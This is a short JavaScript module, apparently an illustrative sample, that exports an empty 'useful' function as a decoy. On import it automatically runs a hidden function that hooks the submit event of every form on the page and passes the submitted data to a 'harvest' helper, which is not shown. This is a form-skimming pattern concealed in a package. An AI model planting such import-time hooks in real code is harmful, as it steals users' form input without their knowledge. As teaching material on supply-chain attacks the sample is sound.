import * as _ from 'lodash';
import { harvest } from './helpers';

/**
 *  Do something useful (and actually do it).
 *  This is where we convince people to use our module.
 */
export const usefulFn = () => {};

/**
 * Harvests form data from the user once the page has loaded and a form is submitted
 * */
const badFn = () => {
  document.addEventListener('DOMContentLoaded', () => {
    _.forEach(document.forms, (form) => {
      form.addEventListener('submit', e => harvest(e, form));
    });
  });
};

// Automatically run this function when our module is referenced
badFn();
